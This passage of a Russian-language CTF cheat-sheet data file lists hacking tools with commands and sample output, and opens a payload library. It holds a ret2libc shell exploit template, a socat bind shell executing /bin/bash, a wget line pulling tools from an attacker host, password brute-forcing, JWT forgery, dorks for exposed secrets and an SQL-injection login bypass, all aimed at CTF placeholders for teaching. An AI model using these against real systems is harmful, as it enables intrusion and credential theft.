        { arg: "filetype:[расширение]", desc: "Искать файлы конкретного типа: pdf, txt, log, sql, env, bak." },
        { arg: "intitle:[заголовок]", desc: "Слово должно быть в заголовке страницы." },
        { arg: "inurl:[путь]", desc: "Слово должно быть в URL-адресе." }
      ],
      output: `site:target.ctf filetype:txt password\nsite:target.ctf inurl:admin intitle:login\nsite:target.ctf filetype:env OR filetype:bak`,
      important: [
        { token: "filetype:env", desc: "Поиск открытых .env файлов — они часто содержат API-ключи, пароли БД и другие секреты." },
        { token: "filetype:bak", desc: "Резервные копии файлов. Часто содержат исходный код с hardcoded паролями или флагами." }
      ]
    },

    // === WEB (дополнительные) ===
    {
      id: "web-ffuf",
      categoryId: "web",
      tool: "ffuf",
      description: "Быстрый и гибкий веб-фаззер. Позволяет фаззить директории, параметры, заголовки и значения куки. Работает на порядок быстрее gobuster.",
      command: "ffuf -u [url]/FUZZ -w [словарь] -mc 200,301,302 -t 50",
      frequency: "high",
      explanation: [
        { arg: "ffuf", desc: "Fuzz Faster U Fool — быстрый веб-фаззер." },
        { arg: "-u [url]/FUZZ", desc: "URL с маркером FUZZ — сюда будут подставляться слова из словаря." },
        { arg: "-w [словарь]", desc: "Файл со словарём. Например: `/usr/share/seclists/Discovery/Web-Content/common.txt`." },
        { arg: "-mc 200,301,302", desc: "Match codes — показывать только ответы с этими HTTP-кодами." },
        { arg: "-t 50", desc: "Количество параллельных потоков (threads)." }
      ],
      output: `user@ctf-box:~$ ffuf -u http://target.ctf/FUZZ -w common.txt -mc 200,301\n\nadmin                   [Status: 301, Size: 0]\nflag.txt                [Status: 200, Size: 38]\nsecret                  [Status: 200, Size: 124]`,
      important: [
        { token: "flag.txt [Status: 200]", desc: "Файл существует и доступен. Скачайте его командой `curl http://target.ctf/flag.txt`." }
      ]
    },
    {
      id: "web-nikto",
      categoryId: "web",
      tool: "nikto",
      description: "Сканер веб-серверов на наличие известных уязвимостей, небезопасных конфигураций и устаревших версий ПО. Хорошая отправная точка для анализа.",
      command: "nikto -h [url_или_ip] -port [порт] -Tuning [тип]",
      frequency: "medium",
      explanation: [
        { arg: "nikto", desc: "Сканер уязвимостей веб-серверов." },
        { arg: "-h [url_или_ip]", desc: "Цель для сканирования (host)." },
        { arg: "-port [порт]", desc: "Порт сервера (по умолчанию 80/443)." },
        { arg: "-Tuning [тип]", desc: "Тип проверок: `1` — интересные файлы, `2` — неправильная конфигурация, `9` — SQL-инъекции." }
      ],
      output: `user@ctf-box:~$ nikto -h http://target.ctf\n+ Server: Apache/2.4.29 (Ubuntu) — OUTDATED\n+ /backup/: Directory indexing found.\n+ /admin/config.php: PHP config file found.\n+ OSVDB-3233: /phpinfo.php: Contains PHP configuration info.`,
      important: [
        { token: "/backup/: Directory indexing", desc: "Открытый листинг директории. Перейдите по URL — там могут быть резервные копии исходников или баз данных." },
        { token: "phpinfo.php", desc: "Открытый phpinfo() раскрывает пути на сервере, версии ПО и настройки PHP — полезно для дальнейшей атаки." }
      ]
    },
    {
      id: "web-hydra",
      categoryId: "web",
      tool: "hydra",
      description: "Инструмент брутфорса аутентификации по сети. Поддерживает HTTP-формы, SSH, FTP, SMTP и десятки других протоколов.",
      command: "hydra -l [логин] -P [словарь.txt] [хост] http-post-form \"/login:username=^USER^&password=^PASS^:[признак_ошибки]\"",
      frequency: "medium",
      explanation: [
        { arg: "-l [логин]", desc: "Фиксированный логин для атаки (или `-L` для списка логинов)." },
        { arg: "-P [словарь]", desc: "Файл со словарём паролей (или `-p` для одного пароля)." },
        { arg: "http-post-form", desc: "Протокол атаки — HTTP POST запрос к форме входа." },
        { arg: "'/login:...:Invalid'", desc: "Формат: путь : POST-тело с ^USER^ и ^PASS^ : строка, которая появляется при неверном пароле." }
      ],
      output: `user@ctf-box:~$ hydra -l admin -P rockyou.txt target.ctf http-post-form "/login:u=^USER^&p=^PASS^:Wrong"\n[80][http-post-form] host: target.ctf   login: admin   password: admin1337`,
      important: [
        { token: "login: admin  password: admin1337", desc: "Найденная пара логин/пароль. Используйте её для входа в панель администратора." }
      ]
    },
    {
      id: "web-jwt",
      categoryId: "web",
      tool: "jwt_tool",
      description: "Инструмент для анализа, проверки и атак на JWT-токены. Поддерживает атаку alg:none, взлом HS256 ключа и подделку токенов.",
      command: "python3 jwt_tool.py [токен] -T",
      frequency: "medium",
      explanation: [
        { arg: "python3 jwt_tool.py", desc: "Запуск jwt_tool." },
        { arg: "[токен]", desc: "JWT-токен в формате header.payload.signature (скопируйте из Cookie или заголовка Authorization)." },
        { arg: "-T", desc: "Режим Tamper — интерактивное изменение полей payload (например, role: user → admin)." }
      ],
      output: `user@ctf-box:~$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... -T\n[+] Decoded payload: {"user": "guest", "role": "user"}\n[*] Trying alg:none attack...\n[+] Success! New token accepted with role: admin`,
      important: [
        { token: "alg:none", desc: "Критическая уязвимость JWT: сервер принимает токен без подписи. Устанавливает algorithm=none и удаляет сигнатуру." },
        { token: "role: admin", desc: "После подделки payload повысились привилегии. Используйте новый токен в заголовке Authorization: Bearer [новый_токен]." }
      ]
    },
    {
      id: "web-wfuzz",
      categoryId: "web",
      tool: "wfuzz",
      description: "Гибкий фаззер параметров HTTP. Особенно удобен для поиска скрытых GET/POST-параметров и IDOR-уязвимостей.",
      command: "wfuzz -c -z range,1-1000 --hc 404 [url]?id=FUZZ",
      frequency: "medium",
      explanation: [
        { arg: "wfuzz", desc: "Инструмент фаззинга веб-приложений." },
        { arg: "-c", desc: "Цветной вывод для удобства чтения." },
        { arg: "-z range,1-1000", desc: "Генератор полезных нагрузок: числа от 1 до 1000." },
        { arg: "--hc 404", desc: "Hide Code — скрывать ответы с кодом 404 (не найдено)." },
        { arg: "?id=FUZZ", desc: "Маркер FUZZ заменяется значениями из генератора." }
      ],
      output: `user@ctf-box:~$ wfuzz -c -z range,1-500 --hc 404 http://target.ctf/user?id=FUZZ\n000000001:   200   1 L     5 W    42 Ch   "1"\n000000042:   200   1 L     8 W    95 Ch   "42"\n000000313:   200   1 L    12 W   220 Ch   "313"`,
      important: [
        { token: "220 Ch (id=313)", desc: "Ответ заметно длиннее остальных — скорее всего, это запись с флагом или привилегированными данными. Проверьте `curl http://target.ctf/user?id=313`." }
      ]
    },

    // === PWN (дополнительные) ===
    {
      id: "pwn-one-gadget",
      categoryId: "pwn",
      tool: "one_gadget",
      description: "Находит RCE-гаджеты в libc — адреса, прыжок на которые сразу порождает шелл без построения длинной ROP-цепочки.",
      command: "one_gadget [путь_к_libc.so]",
      frequency: "high",
      explanation: [
        { arg: "one_gadget", desc: "Утилита поиска one-gadget RCE в библиотеке libc." },
        { arg: "[путь_к_libc.so]", desc: "Путь к libc, которую использует уязвимый бинарник. Часто `/lib/x86_64-linux-gnu/libc.so.6`." }
      ],
      output: `user@ctf-box:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6\n0x4f2a5  execve("/bin/sh", rsp+0x40, environ)\nconditions:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0xe6c7e  execve("/bin/sh", rsp+0x40, environ)\nconditions:\n  [rsp+0x40] == NULL`,
      important: [
        { token: "0x4f2a5", desc: "Смещение one-gadget в libc. Прибавьте к базовому адресу libc (узнайте через утечку адреса) — получите абсолютный адрес для прыжка." },
        { token: "conditions:", desc: "Условия, которые должны быть выполнены в момент прыжка. Если одно не выполняется, попробуйте следующий гаджет из списка." }
      ]
    },
    {
      id: "pwn-pwndbg",
      categoryId: "pwn",
      tool: "pwndbg (GDB plugin)",
      description: "Расширение GDB с удобным интерфейсом для эксплойт-разработки. Показывает стек, регистры и дизассемблер после каждого шага.",
      command: "gdb ./task\n# Внутри GDB с pwndbg:\ncyclic 200 | ./task\ncyclic -l [адрес_из_краша]",
      frequency: "high",
      explanation: [
        { arg: "cyclic 200", desc: "Сгенерировать и сразу передать в stdin программы паттерн длиной 200 байт." },
        { arg: "| ./task", desc: "Программа получит паттерн как stdin и упадёт с записью паттерна в RIP/EIP." },
        { arg: "cyclic -l [адрес]", desc: "Вычислить смещение: укажите адрес из краша — узнаете сколько байт до перезаписи RIP." }
      ],
      output: `pwndbg> cyclic 200 | ./task\nProgram received signal SIGSEGV\nRIP: 0x6161616c ('laaa')\n\npwndbg> cyclic -l 0x6161616c\n44`,
      important: [
        { token: "RIP: 0x6161616c", desc: "Адрес возврата перезаписан частью паттерна. Это значит программа выполнила ret — мы контролируем поток исполнения." },
        { token: "44", desc: "Смещение: нужно ровно 44 байта мусора, чтобы достичь адреса возврата и перезаписать RIP нужным значением." }
      ]
    },
    {
      id: "pwn-ret2libc",
      categoryId: "pwn",
      tool: "pwntools (ret2libc шаблон)",
      description: "Типовой Python-скрипт эксплойта ret2libc: находит адрес system() через утечку адреса libc, затем вызывает system('/bin/sh').",
      command: "python3 exploit.py",
      frequency: "high",
      explanation: [
        { arg: "ELF('./task')", desc: "Загрузить бинарник для извлечения адресов PLT/GOT." },
        { arg: "libc.address = leaked - libc.sym['puts']", desc: "Вычислить базовый адрес libc по утечке адреса puts из GOT." },
        { arg: "p64(libc.sym['system'])", desc: "Адрес функции system() в libc для использования в ROP-цепочке." },
        { arg: "p64(next(libc.search(b'/bin/sh')))", desc: "Адрес строки '/bin/sh' в libc для передачи как аргумента system()." }
      ],
      output: `# exploit.py:\nfrom pwn import *\nexe = ELF('./task'); libc = ELF('./libc.so.6')\np = remote('target.ctf', 1337)\n# ... утечка адреса ...\nlibc.address = leaked_puts - libc.sym['puts']\nrop = ROP(libc)\nrop.system(next(libc.search(b'/bin/sh\\x00')))\np.sendline(b'A'*offset + bytes(rop))\np.interactive()`,
      important: [
        { token: "libc.address = leaked - libc.sym['puts']", desc: "Ключевая строка: зная реальный адрес одной функции libc, вычисляем базу — и знаем адреса ВСЕХ функций libc." }
      ]
    },
    {
      id: "pwn-seccomp",
      categoryId: "pwn",
      tool: "seccomp-tools",
      description: "Анализирует seccomp-фильтры в бинарнике. Показывает, какие системные вызовы разрешены/запрещены — это определяет вектор атаки при pwn-заданиях.",
      command: "seccomp-tools dump [путь_к_файлу]",
      frequency: "low",
      explanation: [
        { arg: "seccomp-tools", desc: "Инструмент анализа Secure Computing Mode (seccomp) фильтров." },
        { arg: "dump", desc: "Запустить программу и перехватить её seccomp-фильтр во время выполнения." },
        { arg: "[путь_к_файлу]", desc: "Анализируемый бинарник с seccomp-фильтром." }
      ],
      output: `user@ctf-box:~$ seccomp-tools dump ./sandbox\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0007\n 0004: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0007  [KILL]`,
      important: [
        { token: "execve [KILL]", desc: "Системный вызов execve запрещён — обычный шеллкод не сработает. Нужно искать альтернативу: openat+read+write для чтения флага без шелла." }
      ]
    },

    // === FORENSICS (дополнительные) ===
    {
      id: "for-xxd",
      categoryId: "forensics",
      tool: "hexdump / xxd",
      description: "Анализ файла на уровне байт. Помогает найти магические байты (заголовки форматов), скрытые данные в конце файла и аномалии структуры.",
      command: "xxd [файл] | head -20 && xxd [файл] | tail -20",
      frequency: "high",
      explanation: [
        { arg: "xxd [файл] | head -20", desc: "Показать первые 20 строк hex-дампа — заголовок файла с магическими байтами." },
        { arg: "xxd [файл] | tail -20", desc: "Показать последние 20 строк — хвост файла, где часто прячут данные после EOF." }
      ],
      output: `user@ctf-box:~$ xxd image.jpg | head -3\n00000000: ffd8 ffe0 0010 4a46 4946 0001 ...  ....JFIF...\nuser@ctf-box:~$ xxd image.jpg | tail -3\n0001f2a0: 0000 0000 666c 6167 7b68 6964 ...  ....flag{hid`,
      important: [
        { token: "ffd8 ffe0", desc: "Магические байты JPEG. Известные сигнатуры: PNG=89504e47, ZIP=504b0304, PDF=25504446, ELF=7f454c46." },
        { token: "данные после EOF", desc: "В JPEG конец файла — FFD9. Всё что после — скрытые данные, appendable payload или другой файл." }
      ]
    },
    {
      id: "for-dd",
      categoryId: "forensics",
      tool: "dd",
      description: "Низкоуровневое копирование данных побайтово. Используется для создания образов дисков, извлечения конкретных секций файла по смещению.",
      command: "dd if=[источник] of=[образ.dd] bs=512 status=progress",
      frequency: "medium",
      explanation: [
        { arg: "dd", desc: "Data Duplicator — утилита побайтового копирования." },
        { arg: "if=[источник]", desc: "Input file — источник (устройство `/dev/sdb` или файл)." },
        { arg: "of=[образ.dd]", desc: "Output file — куда записать побитовую копию." },
        { arg: "bs=512", desc: "Block size — размер блока чтения/записи в байтах." },
        { arg: "status=progress", desc: "Показывать прогресс копирования (скорость, объём)." }
      ],
      output: `user@ctf-box:~$ dd if=/dev/sdb of=disk.dd bs=512 status=progress\n4194304 bytes (4.2 MB, 4.0 MiB) copied, 2 s, 2.1 MB/s\n8192+0 records in, 8192+0 records out`,
      important: [
        { token: "if=/dev/sdb", desc: "Снимается побитовая копия носителя вместе с удалёнными файлами. После этого работайте только с копией disk.dd — оригинал не трогать." }
      ]
    },
    {
      id: "for-strings-pcap",
      categoryId: "forensics",
      tool: "strings + grep (pcap)",
      description: "Быстрый поиск текстовых данных в pcap-файлах без Wireshark. Находит пароли, флаги и URL-адреса, переданные в открытом виде.",
      command: "strings [трафик.pcap] | grep -Ei 'flag|password|token|secret|key'",
      frequency: "high",
      explanation: [
        { arg: "strings [файл.pcap]", desc: "Извлечь все читаемые ASCII-строки из бинарного pcap-файла." },
        { arg: "grep -Ei", desc: "Фильтровать без учёта регистра (-i) по расширенному регулярному выражению (-E)." },
        { arg: "'flag|password|token|secret'", desc: "Ключевые слова, указывающие на потенциально интересные данные в трафике." }
      ],
      output: `user@ctf-box:~$ strings capture.pcap | grep -Ei 'flag|password'\npassword=flag{strings_in_pcap_1337}\nAuthorization: Bearer flag{http_token_leaked}`,
      important: [
        { token: "password=flag{...}", desc: "Пароль передан в открытом виде (HTTP без TLS). Именно поэтому все важные данные должны передаваться только по HTTPS." }
      ]
    },
    {
      id: "for-scalpel",
      categoryId: "forensics",
      tool: "scalpel",
      description: "File carver — восстанавливает файлы из образов дисков по сигнатурам. Более гибок в настройке чем foremost: можно указывать свои заголовки и «хвосты».",
      command: "scalpel -b -o [папка_вывода] [образ.dd]",
      frequency: "medium",
      explanation: [
        { arg: "scalpel", desc: "Инструмент восстановления (карвинга) файлов по сигнатурам." },
        { arg: "-b", desc: "Режим не-интерактивный (batch) — не задавать вопросов." },
        { arg: "-o [папка_вывода]", desc: "Директория для сохранения восстановленных файлов." },
        { arg: "[образ.dd]", desc: "Исходный образ диска или памяти." }
      ],
      output: `user@ctf-box:~$ scalpel -b -o carved/ disk.dd\nScalpel version 2.0\nProcessing: disk.dd\njpg: 12 files\npdf: 3 files\nzip: 1 files`,
      important: [
        { token: "zip: 1 files", desc: "Найден и восстановлен ZIP-архив. Проверьте папку `carved/zip-0-0/` — там может быть флаг." }
      ]
    },
    {
      id: "for-bulk-extractor",
      categoryId: "forensics",
      tool: "bulk_extractor",
      description: "Извлекает структурированные данные из образов: email-адреса, URL, номера телефонов, хэши паролей, ключи шифрования, без монтирования файловой системы.",
      command: "bulk_extractor -o [папка_вывода] -E [модуль] [образ.dd]",
      frequency: "low",
      explanation: [
        { arg: "bulk_extractor", desc: "Инструмент извлечения артефактов из образов дисков и памяти." },
        { arg: "-o [папка_вывода]", desc: "Директория для сохранения отчётов (txt-файлы по типу данных)." },
        { arg: "-E [модуль]", desc: "Включить конкретный модуль: `email`, `url`, `domain`, `base16`, `pdf`." },
        { arg: "[образ.dd]", desc: "Образ диска или дамп памяти." }
      ],
      output: `user@ctf-box:~$ bulk_extractor -o out/ disk.dd\nFound 42 email addresses → out/email.txt\nFound 18 URLs → out/url.txt\nFound AES key material → out/aes.txt`,
      important: [
        { token: "aes.txt", desc: "Найдены ключевые материалы AES. Это может быть ключ шифрования, который поможет расшифровать найденные зашифрованные файлы." }
      ]
    },

    // === STEGO (дополнительные) ===
    {
      id: "steg-stegoveritas",
      categoryId: "stego",
      tool: "stegoveritas",
      description: "Автоматизированный all-in-one анализатор стеганографии. Запускает десятки проверок на изображении и сохраняет результаты: LSB, цветовые плоскости, метаданные.",
      command: "stegoveritas [картинка] -meta -imageTransform -bruteLSB",
      frequency: "high",
      explanation: [
        { arg: "stegoveritas", desc: "Автоматический анализатор стеганографии." },
        { arg: "-meta", desc: "Извлечь и вывести все метаданные файла." },
        { arg: "-imageTransform", desc: "Применить набор трансформаций изображения (инверсия, усиление каналов, фильтры)." },
        { arg: "-bruteLSB", desc: "Перебор всех комбинаций LSB-каналов для поиска скрытого текста." }
      ],
      output: `user@ctf-box:~$ stegoveritas challenge.png -bruteLSB\n[+] Saving results to /tmp/results/\n[LSB] Found data in channel R bit 0: 'flag{stegoveritas_auto_found_it}'`,
      important: [
        { token: "results/", desc: "Все результаты сохраняются в папку. Проверьте все сгенерированные изображения — на некоторых трансформациях скрытый паттерн становится видим." }
      ]
    },
    {
      id: "steg-ffmpeg",
      categoryId: "stego",
      tool: "ffmpeg (кадры из видео)",
      description: "Извлекает отдельные кадры из видеофайла. В CTF стего-задачах флаг часто мелькает на одном конкретном кадре, невидимом при обычном воспроизведении.",
      command: "ffmpeg -i [видео.mp4] -vf fps=1 frame_%04d.png",
      frequency: "medium",
      explanation: [
        { arg: "ffmpeg", desc: "Мощная утилита обработки аудио и видео." },
        { arg: "-i [видео.mp4]", desc: "Входной видеофайл." },
        { arg: "-vf fps=1", desc: "Video filter: извлекать 1 кадр в секунду. Замените на `fps=30` для всех кадров." },
        { arg: "frame_%04d.png", desc: "Шаблон имён выходных файлов: frame_0001.png, frame_0002.png, ..." }
      ],
      output: `user@ctf-box:~$ ffmpeg -i secret.mp4 -vf fps=30 frame_%04d.png\nframe_0001.png, frame_0002.png, ..., frame_0847.png\n# Смотрим каждый кадр: eog frame_*.png`,
      important: [
        { token: "fps=30", desc: "Используйте fps равное FPS видео, чтобы извлечь каждый кадр. Флаг может быть виден только 1/30 секунды." }
      ]
    },
    {
      id: "steg-wav-spectrum",
      categoryId: "stego",
      tool: "sox + spectrogram",
      description: "Строит спектрограмму аудиофайла. Классическая CTF-техника: флаг визуально зашит в спектрограмме WAV/MP3 как изображение.",
      command: "sox [аудио.wav] -n spectrogram -o spectrogram.png",
      frequency: "medium",
      explanation: [
        { arg: "sox", desc: "Swiss Army knife для обработки аудио в командной строке." },
        { arg: "[аудио.wav]", desc: "Входной аудиофайл (WAV, FLAC, MP3 с плагинами)." },
        { arg: "-n", desc: "Не генерировать выходной аудиофайл (null output)." },
        { arg: "spectrogram -o spectrogram.png", desc: "Создать визуальную спектрограмму и сохранить как PNG." }
      ],
      output: `user@ctf-box:~$ sox audio.wav -n spectrogram -o spec.png\n# Открыть изображение:\neog spec.png\n# На спектрограмме виден текст: flag{spectogram_stego_audio}`,
      important: [
        { token: "спектрограмма", desc: "Откройте результирующий PNG — если флаг зашит в частотах, он будет виден как текст или рисунок на картинке. Ищите в верхней части (высокие частоты)." }
      ]
    },
    {
      id: "steg-python-lsb",
      categoryId: "stego",
      tool: "python3 (LSB extraction)",
      description: "Ручное извлечение LSB-стеганографии из PNG через библиотеку Pillow. Используйте, когда zsteg и steghide ничего не находят — возможно нестандартный порядок битов.",
      command: "python3 -c \"from PIL import Image; img=Image.open('[картинка.png]').convert('RGB'); bits=''.join(str(p[0]&1) for p in img.getdata()); print(bytes(int(bits[i:i+8],2) for i in range(0,len(bits)-8,8) if int(bits[i:i+8],2)>31).decode(errors='ignore'))\"",
      frequency: "medium",
      explanation: [
        { arg: "img.getdata()", desc: "Получить пиксели изображения как список RGB-кортежей." },
        { arg: "p[0]&1", desc: "Извлечь младший бит (LSB) из красного канала каждого пикселя." },
        { arg: "int(bits[i:i+8],2)", desc: "Собрать 8 бит в один байт." }
      ],
      output: `user@ctf-box:~$ python3 -c "..."\nflag{manual_lsb_python_pillow_extraction}`,
      important: [
        { token: "p[0]&1", desc: "Меняйте канал: p[1] — зелёный, p[2] — синий. Порядок тоже может быть MSB-first: `(p[0]>>7)&1`. Перебирайте варианты." }
      ]
    },

    // === MISC (дополнительные) ===
    {
      id: "misc-base64",
      categoryId: "misc",
      tool: "base64 / base32 / base58",
      description: "Быстрое декодирование популярных кодировок прямо в терминале. base64, base32 и base58 — самые частые «шифры» в CTF Misc.",
      command: "echo '[строка]' | base64 -d\necho '[строка]' | base32 -d\npython3 -c \"import base64; print(base64.b85decode('[строка]'))\"",
      frequency: "high",
      explanation: [
        { arg: "base64 -d", desc: "Декодировать Base64 (алфавит A-Z, a-z, 0-9, +, /)." },
        { arg: "base32 -d", desc: "Декодировать Base32 (алфавит A-Z, 2-7, заполнитель =)." },
        { arg: "base64.b85decode", desc: "Base85 через Python — нет стандартного CLI-инструмента." }
      ],
      output: `user@ctf-box:~$ echo 'MFZWIZLTOQQHG===' | base32 -d\nflag{base32}`,
      important: [
        { token: "Признак Base64", desc: "Длина кратна 4, символы [A-Za-z0-9+/=]. Base32: длина кратна 8, только заглавные + цифры 2-7. Base58: только цифры и буквы без O, 0, l, I." }
      ]
    },
    {
      id: "misc-python-server",
      categoryId: "misc",
      tool: "python3 -m http.server",
      description: "Мгновенный файловый HTTP-сервер для передачи файлов между машинами во время CTF. Запускается в одну команду в любой папке.",
      command: "python3 -m http.server [порт] --bind [ip]",
      frequency: "high",
      explanation: [
        { arg: "python3 -m http.server", desc: "Встроенный модуль Python для раздачи файлов текущей директории по HTTP." },
        { arg: "[порт]", desc: "Порт для прослушивания (по умолчанию 8000)." },
        { arg: "--bind [ip]", desc: "Привязать к конкретному IP (по умолчанию 0.0.0.0 — все интерфейсы)." }
      ],
      output: `user@ctf-box:~$ python3 -m http.server 9000\nServing HTTP on 0.0.0.0 port 9000 ...\n# Скачать с другой машины:\nwget http://[ваш_ip]:9000/exploit.py`,
      important: [
        { token: "wget / curl для скачивания", desc: "На целевой машине: `wget http://[атакующий]:9000/файл` или `curl -O http://[атакующий]:9000/файл`. Удобно для загрузки инструментов на сервер." }
      ]
    },
    {
      id: "misc-socat",
      categoryId: "misc",
      tool: "socat",
      description: "Продвинутая альтернатива Netcat. Поддерживает TLS, форматирование данных и двунаправленные тунели. Удобен для реверс-шеллов и проксирования.",
      command: "socat TCP:[хост]:[порт] STDIN",
      frequency: "medium",
      explanation: [
        { arg: "socat", desc: "SOcket CAT — многоцелевая сетевая утилита для перенаправления потоков данных." },
        { arg: "TCP:[хост]:[порт]", desc: "Первый адрес — TCP-соединение с CTF-сервером." },
        { arg: "STDIN", desc: "Второй адрес — стандартный ввод/вывод терминала." }
      ],
      output: `# Подключиться к сервису:\nsocat TCP:target.ctf:1337 STDIN\n\n# Реверс-шелл на сервере (слушатель):\nsocat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash\n\n# Подключиться к реверс-шеллу:\nsocat TCP:target.ctf:4444 STDIN`,
      important: [
        { token: "TCP-LISTEN", desc: "Режим сервера — ждать входящего соединения. Нужно, чтобы firewall разрешал входящий трафик на этот порт." }
      ]
    },
    {
      id: "misc-xxd-reverse",
      categoryId: "misc",
      tool: "xxd (hex → binary)",
      description: "Конвертирует HEX-строку обратно в бинарный файл. Полезно, когда данные скопированы из hex-редактора или представлены как HEX в задании.",
      command: "echo '[hex_строка]' | xxd -r -p > [выходной_файл]",
      frequency: "medium",
      explanation: [
        { arg: "echo '[hex]'", desc: "Передать строку в шестнадцатеричном формате (без пробелов и переносов)." },
        { arg: "xxd -r", desc: "Reverse mode — преобразовать hex обратно в бинарные байты." },
        { arg: "-p", desc: "Plain режим — принимать «чистый» hex без адресов (просто последовательность символов)." },
        { arg: "> [файл]", desc: "Сохранить бинарный результат в файл." }
      ],
      output: `user@ctf-box:~$ echo '89504e470d0a1a0a' | xxd -r -p > header.bin\nuser@ctf-box:~$ file header.bin\nheader.bin: PNG image data`,
      important: [
        { token: "89504e47", desc: "Это заголовок PNG-файла. Восстановленный файл можно сразу проверить командой `file` — если сигнатура верна, файл откроется корректно." }
      ]
    },
    {
      id: "misc-nmap",
      categoryId: "misc",
      tool: "nmap",
      description: "Сканер портов и сервисов. В CTF используется для разведки — найти открытые порты на машине и определить версии работающих сервисов.",
      command: "nmap -sV -sC -p- --min-rate 5000 [хост] -oN scan.txt",
      frequency: "high",
      explanation: [
        { arg: "nmap", desc: "Network Mapper — стандарт де-факто для сетевого сканирования." },
        { arg: "-sV", desc: "Service Version detection — определить версии сервисов на открытых портах." },
        { arg: "-sC", desc: "Script scan — запустить стандартные NSE-скрипты (аналог --script=default)." },
        { arg: "-p-", desc: "Сканировать все 65535 портов (по умолчанию только top-1000)." },
        { arg: "--min-rate 5000", desc: "Минимальная скорость отправки пакетов — ускоряет сканирование." },
        { arg: "-oN scan.txt", desc: "Сохранить результат в читаемый текстовый файл." }
      ],
      output: `user@ctf-box:~$ nmap -sV -sC -p- 10.10.10.10\n22/tcp   open  ssh     OpenSSH 8.2p1\n80/tcp   open  http    Apache httpd 2.4.41\n1337/tcp open  unknown (возможно CTF-сервис)`,
      important: [
        { token: "1337/tcp open", desc: "Нестандартный порт — часто именно здесь живёт CTF-сервис. Подключитесь: `nc 10.10.10.10 1337` или `curl http://10.10.10.10:1337`." }
      ]
    },
    {
      id: "misc-python-decode",
      categoryId: "misc",
      tool: "python3 (универсальный декодер)",
      description: "Python-однострочники для быстрого декодирования данных в разных форматах: hex, URL-encoding, HTML-entities, unicode escape.",
      command: "python3 -c \"import urllib.parse; print(urllib.parse.unquote('[url_encoded]'))\"",
      frequency: "high",
      explanation: [
        { arg: "urllib.parse.unquote", desc: "Декодировать URL-encoding (%20 → пробел, %7B → {)." },
        { arg: "bytes.fromhex('[hex]')", desc: "Декодировать HEX-строку в байты." },
        { arg: "'[str]'.encode().decode('unicode_escape')", desc: "Декодировать Unicode escape-последовательности (\\u0066\\u006c\\u0061\\u0067)." }
      ],
      output: `user@ctf-box:~$ python3 -c "print(bytes.fromhex('666c61677b707974686f6e5f68657878787d').decode())"\nflag{python_hexxx}

user@ctf-box:~$ python3 -c "import urllib.parse; print(urllib.parse.unquote('flag%7Burl_encoded%7D'))"\nflag{url_encoded}`,
      important: [
        { token: "bytes.fromhex().decode()", desc: "Самый универсальный приём: конвертировать hex в байты и декодировать как UTF-8. Работает для большинства CTF hex-задач." }
      ]
    }
  ],

  /* ============================================================
     Payload library
     ============================================================ */
  payloadCategories: [
    { id:"sqli",  title:"SQL Injection",       icon:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>`, desc:"Инъекции в SQL-запросы: обход авторизации, извлечение данных, слепые атаки." },
    { id:"xss",   title:"XSS",                  icon:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`, desc:"Cross-Site Scripting — выполнение JavaScript в браузере жертвы." },
    { id:"ssti",  title:"SSTI",                  icon:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>`, desc:"Server-Side Template Injection — RCE через уязвимый шаблонизатор." },
    { id:"lfi",   title:"LFI / Path Traversal",  icon:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>`, desc:"Чтение произвольных файлов через обход пути или уязвимость включения файла." },
    { id:"cmdi",  title:"Command Injection",      icon:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`, desc:"Выполнение команд ОС через уязвимый параметр веб-приложения." },
    { id:"xxe",   title:"XXE",                   icon:`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`, desc:"XML External Entity — чтение файлов и SSRF через XML-парсер." },
  ],

  payloads: [
    // ── SQL Injection ─────────────────────────────────────────
    { id:"sqli-1",  catId:"sqli", title:"Auth bypass — OR 1=1",      desc:"Классический обход авторизации. Вставляется в поле логина или пароля.", payload:`' OR '1'='1'--`,        note:"Попробуйте также: \" OR \"1\"=\"1\"-- для двойных кавычек" },
